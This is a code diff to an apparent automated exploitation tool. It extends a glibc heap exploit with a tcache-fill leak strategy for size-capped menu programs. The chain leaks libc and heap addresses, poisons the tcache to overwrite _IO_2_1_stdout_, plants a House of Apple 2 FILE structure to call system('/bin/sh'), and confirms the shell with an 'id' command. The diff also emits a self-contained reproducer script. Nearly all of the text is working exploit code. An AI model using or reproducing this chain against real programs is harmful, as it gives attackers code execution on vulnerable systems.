@@ -1835,7 +1835,8 @@ def auto_provoke_leak(exe, workdir, target_bytes, libc_data=b"", *, base_argv=()
 
 
 def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, system_off,
-                       poison_size=0x300, guard_size=0x430, width=None) -> bytes:
+                       poison_size=0x300, guard_size=0x430, width=None,
+                       strategy="large-chunk", fill_size=0x100, fill_max=24) -> bytes:
     """A self-contained, stdlib-based reproducer for the automated glibc-heap -> shell chain
     (unsorted-bin libc leak -> tcache-fd heap leak -> tcache poison of _IO_2_1_stdout_ -> House of
     Apple 2 -> system("/bin/sh")). ASLR-dependent, so no static input can exist -- the libc base and
@@ -1854,6 +1855,7 @@ def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, s
         f"UNSORTED_OFF={unsorted_off:#x}; STDOUT_OFF={stdout_off:#x}; "
         f"WFILE_JUMPS_OFF={wfile_jumps_off:#x}; SYSTEM_OFF={system_off:#x}\n"
         f"POISON={poison_size:#x}; GUARD={guard_size:#x}\n"
+        f"STRATEGY={strategy!r}; FILL={fill_size:#x}; FILLMAX={int(fill_max)}\n"
         "SIZES={}\n"
         "def render(t, idx=None, size=None, data=b'', dsize=None):\n"
         "    def sub(s):\n"
@@ -1902,24 +1904,42 @@ def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, s
         "        w=o[i:i+8]\n"
         "        if all(b==0 or 0x20<=b<=0x7e for b in w): continue\n"
         "        yield i, struct.unpack('<Q',w)[0]\n"
+        "def binhead(v):   # a freed chunk links into the unsorted bin head OR, once sorted, its\n"
+        "    if not (0x7F0000000000<=v<0x800000000000): return None   # size's small-bin head; the\n"
+        "    for k in range(128):                                    # bins sit at 0x10 strides and\n"
+        "        b=v-(UNSORTED_OFF+0x10*k)                           # page alignment admits only one\n"
+        "        if b>0 and b%0x1000==0: return b\n"
+        "    return None\n"
         "read_until(p, time.time()+0.5)\n"
-        "op(ADD(0,GUARD,b'A')); op(ADD(1,GUARD,b'B')); op(FREE(0))\n"
-        "vo=op(VIEW(0),0.5); base=None; off=0\n"
-        "for i,v in windows(vo):   # the page-aligned main_arena fd; its offset = where raw bytes begin\n"
-        "    if v<(1<<47) and v-UNSORTED_OFF>0 and (v-UNSORTED_OFF)%0x1000==0: base=v-UNSORTED_OFF; off=i; break\n"
-        "assert base, 'libc leak failed: %s'%vo[:32].hex()\n"
+        "base=None; off=0; PB=2\n"
+        "if STRATEGY=='tcache-fill':   # size-capped notebook: fill the bin until a chunk spills out\n"
+        "    PB=0\n"
+        "    for i in range(FILLMAX+1): op(ADD(i,FILL,b'A'))\n"
+        "    for i in range(FILLMAX):\n"
+        "        op(FREE(i)); vo=op(VIEW(i),0.45)\n"
+        "        for o,v in windows(vo):\n"
+        "            b=binhead(v)\n"
+        "            if b: base,off=b,o; break\n"
+        "        if base: break\n"
+        "else:                         # one above-tcache chunk links into a bin head immediately\n"
+        "    op(ADD(0,GUARD,b'A')); op(ADD(1,GUARD,b'B')); op(FREE(0))\n"
+        "    vo=op(VIEW(0),0.5)\n"
+        "    for o,v in windows(vo):\n"
+        "        b=binhead(v)\n"
+        "        if b: base,off=b,o; break\n"
+        "assert base, 'libc leak failed'\n"
         "stdout_addr=base+STDOUT_OFF\n"
-        "op(ADD(2,POISON,b'C')); op(ADD(3,POISON,b'D')); op(FREE(2))\n"
-        "ho=op(VIEW(2),0.5); heap=0\n"
+        "op(ADD(PB,POISON,b'C')); op(ADD(PB+1,POISON,b'D')); op(FREE(PB))\n"
+        "ho=op(VIEW(PB),0.5); heap=0\n"
         "if len(ho)>=off+8:   # the safe-linked fd sits at the same offset as the libc fd did\n"
         "    c=struct.unpack('<Q',ho[off:off+8])[0]\n"
         "    if 0<c<(1<<40): heap=c\n"
         "if not heap: heap=next((v for _,v in windows(ho) if 0<v<(1<<40)),0)\n"
         "assert heap, 'heap leak failed'\n"
-        "op(ADD(2,POISON,b'C')); op(FREE(3)); op(FREE(2))\n"
-        "op(EDIT(2, struct.pack('<Q', heap ^ stdout_addr)+b'\\x00'*8)); op(ADD(4,POISON,b'E'))\n"
+        "op(ADD(PB,POISON,b'C')); op(FREE(PB+1)); op(FREE(PB))\n"
+        "op(EDIT(PB, struct.pack('<Q', heap ^ stdout_addr)+b'\\x00'*8)); op(ADD(PB+2,POISON,b'E'))\n"
         "blob=hoa2(stdout_addr, base+WFILE_JUMPS_OFF, base+SYSTEM_OFF)\n"
-        "op(ADD(5,POISON,blob[:POISON]))\n"
+        "op(ADD(PB+3,POISON,blob[:POISON]))\n"
         "p.stdin.write(EXIT); p.stdin.flush(); time.sleep(0.3)\n"
         "p.stdin.write(b'id; echo PWNED-LYKOS\\n'); p.stdin.flush()\n"
         "out=read_until(p, time.time()+8, quiet=1.5)\n"
@@ -1930,14 +1950,18 @@ def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, s
 
 
 # --- automated glibc-heap -> shell: tcache poison _IO_2_1_stdout_ + House of Apple 2 (gap #4) ----
-def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_data, unsorted_off,
-                      poison_size=0x300, guard_size=0x430, marker=b"LYKOS-HEAP-9931",
-                      timeout=10.0, base_argv=(), mem_mb=2048) -> dict:
+def _heap_fsop_attempt(exe, workdir, *, add, free, view, edit, exit_seq, libc_data, unsorted_off,
+                       poison_size=0x300, guard_size=0x430, fill_size=0x100, use_fill=False,
+                       marker=b"LYKOS-HEAP-9931",
+                       timeout=10.0, base_argv=(), mem_mb=2048) -> dict:
     """Drive a menu-style glibc-heap target to a shell, fully automatically, via tcache poisoning +
     House of Apple 2. Composes the pieces lykos already has (menu model, safe-linking, FSOP):
 
       1. libc leak  -- free a large chunk (skips tcache -> unsorted bin, its fd points into libc);
-         view it; `base = leaked - unsorted_off` (main_arena+0x60 for the target's glibc).
+         view it; `base = leaked - unsorted_off` (main_arena+0x60 for the target's glibc). A
+         SIZE-CAPPED notebook refuses that large request, so fall back to a tcache-FILL spill: free
+         same-size chunks until one no longer fits the tcache bin and links into a main_arena bin
+         head instead (the count is DISCOVERED, not assumed -- it is 7 on older glibc and 16 on 2.43).
       2. heap leak  -- free a tcache chunk and view its fd == chunk>>12 (safe-linking key; the low
          bits are not needed, mangle only XORs the page).
       3. poison     -- with two freed tcache chunks, edit the head's fd to mangle(chunk, stdout);
@@ -1975,6 +1999,22 @@ def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_dat
             return b""
         return _read_until(p, time.time() + read_secs, quiet=0.2)
 
+    def _bin_head_base(v):
+        """libc base from a leaked bin-head pointer. A chunk that outgrows the tcache links into the
+        UNSORTED bin head (main_arena+0x60 == unsorted_off), but once glibc sorts it, into its size's
+        SMALL BIN head instead -- the bins live in one array at 0x10 strides, so the leak is
+        `unsorted_off + 0x10*k` for an unknown k. Try each: because page alignment forces
+        `cand == v (mod 0x1000)` and the candidates are distinct residues, AT MOST ONE k can match,
+        so this cannot silently pick a second, wrong base. Requires a libc-range pointer first, so a
+        heap/stack value is never mistaken for a bin head."""
+        if not (0x7F0000000000 <= v < 0x800000000000):
+            return None
+        for k in range(128):
+            b = rop.resolve_libc_base(v, unsorted_off + 0x10 * k)
+            if b:
+                return b
+        return None
+
     def _windows(out):
         """(offset, value) for each 8-byte little-endian window of a view's output that could be a
         POINTER. A real menu may print a prompt ("idx: ", "Content: ") before the raw chunk bytes, so
@@ -1986,35 +2026,62 @@ def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_dat
                 continue
             yield i, _struct.unpack("<Q", win)[0]
 
-    try:
-        _read_until(p, time.time() + 0.5)
-        # 1) libc leak via the unsorted bin: the first window resolving to a PAGE-ALIGNED libc base is
-        #    the main_arena fd. A window straddling the prompt cannot pass that guard (its low byte is
-        #    ASCII, never main_arena's low byte), so the match offset is exactly where this view's raw
-        #    chunk bytes begin past any prompt -- the calibration step 2 reuses.
+    def _leak_libc_large():
+        """A single large (above-tcache) chunk frees straight to a bin head. Two allocations so the
+        freed one is not adjacent to the top chunk (which would consolidate instead of linking)."""
         _op(add(0, guard_size, b"A"))
-        _op(add(1, guard_size, b"B"))               # guard: stops back-consolidation with the top
+        _op(add(1, guard_size, b"B"))
         _op(free(0))
         vout = _op(view(0), 0.5)
-        data_off, base = 0, None
         for i, v in _windows(vout):
-            if v < (1 << 47):
-                base = rop.resolve_libc_base(v, unsorted_off)
-                if base:
-                    data_off = i
-                    break
+            b = _bin_head_base(v)
+            if b:
+                return b, i, 2
+        return None, 0, 0
+
+    def _leak_libc_fill(fill_size, max_fill=24):
+        """Size-capped notebook: the large request above is refused, so FILL the tcache bin for a
+        permitted size and keep freeing until one chunk no longer fits it and links into a main_arena
+        bin head. The capacity is discovered by viewing each freed chunk rather than assumed (7 on
+        older glibc, 16 on 2.43), so this needs no per-version constant. `fill_size` must be above
+        the fastbin ceiling (a fastbin fd is a heap pointer, never libc); the caller picks it."""
+        for i in range(max_fill + 1):                # the last allocation guards the top chunk
+            _op(add(i, fill_size, b"A"))
+        for i in range(max_fill):
+            _op(free(i))
+            vout = _op(view(i), 0.45)
+            for off, v in _windows(vout):
+                b = _bin_head_base(v)
+                if b:
+                    return b, off, i + 1
+        return None, 0, 0
+
+    try:
+        _read_until(p, time.time() + 0.5)
+        # 1) libc leak. The matching window's OFFSET is where this view's raw chunk bytes begin past
+        #    any prompt (a prompt-straddling window cannot pass the page-alignment guard), which the
+        #    heap leak below reuses as calibration.
+        base, data_off, used = (_leak_libc_fill(fill_size) if use_fill else _leak_libc_large())
         if not base:
-            return {"ok": False, "reason": f"libc leak failed (dump {vout[:32].hex()})"}
+            return {"ok": False,
+                    "reason": (f"libc leak failed (tcache-fill at {fill_size:#x} disclosed no bin "
+                               "head)" if use_fill else
+                               f"libc leak failed (no bin head from a {guard_size:#x} chunk -- a "
+                               "size cap would refuse it)")}
+        # Poison slots. The large path allocated indices 0-1, so start past them. The fill path left
+        # indices 0.. holding FREED chunks of fill_size, whose slots are free to overwrite: the poison
+        # runs in a DIFFERENT size class, so its own tcache bin is still empty (what step 2 needs).
+        pb = 0 if use_fill else 2
         stdout_addr = base + T["stdout"]
         # 2) heap leak via a freed tcache chunk's safe-linked fd == chunk2>>12. The fd sits at the
         #    SAME offset in this view's output as the libc fd did (same view op, same prompts), so read
         #    it there rather than guessing where a prompt ends -- a non-PIE heap page is tiny (~0x405)
         #    and indistinguishable by value from a misaligned prompt-straddling window. Fall back to a
         #    scan only when the calibrated word is implausible (prompt timing shifted the output).
-        _op(add(2, poison_size, b"C"))
-        _op(add(3, poison_size, b"D"))
-        _op(free(2))
-        hout = _op(view(2), 0.5)
+        _op(add(pb, poison_size, b"C"))
+        _op(add(pb + 1, poison_size, b"D"))
+        _op(free(pb))
+        hout = _op(view(pb), 0.5)
         heap_page = 0
         if len(hout) >= data_off + 8:
             cand = _struct.unpack("<Q", hout[data_off:data_off + 8])[0]
@@ -2024,16 +2091,16 @@ def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_dat
             heap_page = next((v for _, v in _windows(hout) if 0 < v < (1 << 40)), 0)
         if not heap_page:
             return {"ok": False, "reason": f"heap leak failed (dump {hout[:32].hex()})"}
-        _op(add(2, poison_size, b"C"))               # take chunk2 back; tcache empty for this size
+        _op(add(pb, poison_size, b"C"))              # take the chunk back; tcache empty for this size
         # 3) poison: free two, mangle the head's fd to _IO_2_1_stdout_
-        _op(free(3))
-        _op(free(2))
-        _op(edit(2, _struct.pack("<Q", heap_page ^ stdout_addr) + b"\x00" * 8))
-        _op(add(4, poison_size, b"E"))               # returns chunk2
+        _op(free(pb + 1))
+        _op(free(pb))
+        _op(edit(pb, _struct.pack("<Q", heap_page ^ stdout_addr) + b"\x00" * 8))
+        _op(add(pb + 2, poison_size, b"E"))          # returns the poisoned chunk
         # 4) the next allocation lands on _IO_2_1_stdout_; write the House of Apple 2 FILE there
         blob = _heap.build_house_of_apple2(stdout_addr, wfile_jumps=base + T["wfile_jumps"],
                                            system=base + T["system"])
-        _op(add(5, poison_size, blob[:poison_size]))
+        _op(add(pb + 3, poison_size, blob[:poison_size]))
         # trigger the flush -> FSOP -> shell, then confirm
         try:
             p.stdin.write(exit_seq)
@@ -2050,7 +2117,9 @@ def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_dat
         out = _read_until(p, time.time() + timeout, quiet=1.5)
         if marker in out:
             return {"ok": True, "libc_base": base, "heap_page": heap_page,
-                    "stdout": stdout_addr, "output": out[:400].decode("latin-1", "ignore")}
+                    "stdout": stdout_addr, "fill_size": fill_size if use_fill else None,
+                    "strategy": "tcache-fill" if use_fill else "large-chunk",
+                    "output": out[:400].decode("latin-1", "ignore")}
         return {"ok": False, "reason": "no shell confirmed", "libc_base": base,
                 "output": out[:200].decode("latin-1", "ignore")}
     finally:
@@ -2065,3 +2134,31 @@ def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_dat
             p.wait(timeout=2)
         except Exception:                               # noqa: BLE001
             pass
+
+
+def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_data, unsorted_off,
+                      poison_size=0x300, guard_size=0x430, fill_size=0x100,
+                      marker=b"LYKOS-HEAP-9931", timeout=10.0, base_argv=(), mem_mb=2048) -> dict:
+    """Drive a menu-style glibc-heap target to a shell (tcache poison of _IO_2_1_stdout_ + House of
+    Apple 2), trying both libc-leak strategies:
+
+      large-chunk -- free one above-tcache chunk; it links into a bin head straight away. Fast, and
+                     what an uncapped notebook allows.
+      tcache-fill -- for a SIZE-CAPPED notebook, which refuses that large request: fill the tcache
+                     bin for a permitted size until a chunk spills into a bin head instead.
+
+    The retry runs on a FRESH process: the refused allocation leaves its data bytes unread, which
+    desyncs the menu (the stray byte is read as the next option) and usually exits the target, so the
+    second strategy cannot share the first one's process. Returns {ok, libc_base, heap_page,
+    strategy, fill_size, ...}; `strategy`/`fill_size` tell the caller what to put in the reproducer."""
+    kw = dict(add=add, free=free, view=view, edit=edit, exit_seq=exit_seq, libc_data=libc_data,
+              unsorted_off=unsorted_off, poison_size=poison_size, guard_size=guard_size,
+              fill_size=fill_size, marker=marker, timeout=timeout, base_argv=base_argv,
+              mem_mb=mem_mb)
+    res = _heap_fsop_attempt(exe, workdir, use_fill=False, **kw)
+    if res.get("ok") or "libc leak failed" not in str(res.get("reason", "")):
+        return res
+    res2 = _heap_fsop_attempt(exe, workdir, use_fill=True, **kw)
+    if not res2.get("ok"):
+        res2["reason"] = f"{res.get('reason')}; then {res2.get('reason')}"
+    return res2
